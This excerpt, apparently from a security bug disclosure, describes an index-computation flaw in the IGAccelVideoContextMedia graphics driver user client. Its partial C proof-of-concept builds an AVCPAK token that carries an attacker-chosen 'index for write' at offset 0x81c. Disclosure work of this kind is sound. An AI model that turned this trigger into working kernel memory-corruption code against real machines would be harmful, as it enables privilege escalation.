...
BUG:
the dword at offset 0x81c of the AVCPAK token used by the IGAccelVideoContextMedia user client is used to compute an index
  ...
  if (selector == 2){
    if (token_buf != 0){
      ...
      if (at){
        ...
        uint16_t* id = at;
        *id = 0x8c00;
        at[0x8/2] = 0; //must be zero
        at[0x81c/4] = 0x12345678; //index for write
      }
